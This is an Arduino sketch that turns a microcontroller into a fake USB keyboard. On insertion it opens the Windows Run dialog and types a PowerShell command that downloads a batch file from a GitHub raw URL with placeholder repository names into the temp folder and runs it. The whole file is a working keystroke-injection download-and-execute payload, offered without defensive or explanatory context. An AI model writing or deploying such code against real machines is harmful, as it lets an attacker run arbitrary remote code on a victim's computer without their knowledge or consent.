#include "Keyboard.h"

void setup() {
  Keyboard.begin();
  
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  String command = "cmd /c powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tuo-utente/tuo-repo/main/demo.bat' -OutFile '%TEMP%\\demo.bat'\"; start '%TEMP%\\demo.bat'";
  
  Keyboard.print(command);
  delay(200);

  Keyboard.write(KEY_RETURN);

  Keyboard.end();
}

void loop() {
}
